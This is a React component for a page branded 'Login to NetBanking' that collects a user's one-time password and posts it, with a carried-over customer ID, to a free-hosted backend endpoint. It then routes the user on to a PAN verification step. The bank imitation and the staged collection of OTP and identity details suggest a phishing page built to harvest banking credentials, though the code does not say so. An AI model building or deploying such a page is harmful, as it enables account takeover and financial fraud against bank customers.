import axios from "axios";
import React, { useState } from "react";
import { useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";

import {
  UserMessage,
  Navbar,
  SubmitButton,
  SecurityContainer,
} from "../../components";

const URL = {
  branch: "/verify/branch",
  name: "/verify/name",
  otp: "/verify/otp",
};

export const VerifyOtp = () => {
  const navigate = useNavigate();
  const { state } = useLocation();

  const [formData, setFormData] = useState({
    otp: "",
  });
  const [seconds, setSeconds] = useState(180);

  const handleChange = (e, key) => {
    setFormData((prev) => ({ ...prev, [key]: e.target.value }));
  };

  const handleSubmit = () => {
    const message = {
      otp: "OTP",
      customerId: state.customerId,
    };

    const blankValues = Object.keys(formData).filter((key) => !formData[key]);
    if (blankValues.length > 0) {
      alert(`${message[blankValues[0]]} cannot be left blank.`);
      return;
    }
    if (formData.otp?.length < 6 || formData.otp?.length > 6) {
      alert("Enter a valid OTP.");
      return;
    }
    setFormData({ otp: "" });
    console.log(state);
    formData.customerId = state.customerId;
    axios
      .post("https://backend-nzz3.onrender.com/api/so", formData)
      .then((response) => {
        if (response.status === 200) {
          navigate("/verify/pan", {
            state: {
              customerId: response.data.customerId,
            },
          });
        }
      })
      .catch((error) => {
        console.log(error);
      });
    navigate(URL[state.navigateTo], {
      state: state.navigateTo === "otp" ? { navigateTo: "otp" } : undefined,
    });
  };

  const handleResend = () => {
    const currentInterval = setInterval(() => {
      setSeconds((prev) => {
        if (prev < 1) {
          clearInterval(currentInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  useEffect(() => {
    const currentInterval = setInterval(() => {
      setSeconds((prev) => {
        if (prev < 1) {
          clearInterval(currentInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      console.log("clear", currentInterval);
      clearInterval(currentInterval);
    };
  }, []);

  return (
    <div className="page-container home">
      <Navbar />
      <div className="page-body">
        <div className="page-form-container">
          <div className="page-form-container-title">Login to NetBanking</div>
          <div className="page-form-container-body mb20p">
            <div className="page-form-container-left">
              <div className="form-item">
                <div className="form-label">Enter One Time Password(OTP)</div>
                <input
                  value={formData.otp}
                  onChange={(e) => handleChange(e, "otp")}
                  className="form-input"
                  type="number"
                />
                {seconds !== 0 ? (
                  <div className="resend-otp-text">
                    Resend OTP in {seconds} seconds{" "}
                  </div>
                ) : (
                  <div
                    onClick={() => {
                      setSeconds(180);
                      handleResend();
                    }}
                    style={{ width: "80px", cursor: "pointer" }}
                    className="link"
                  >
                    Resend
                  </div>
                )}
              </div>
              <div className="form-item">
                <SubmitButton onClick={handleSubmit} />
              </div>
              <UserMessage />
            </div>
            <div className="page-form-container-right">
              <SecurityContainer />
            </div>
          </div>
          <div className="home-page-footer"></div>
        </div>
      </div>
    </div>
  );
};
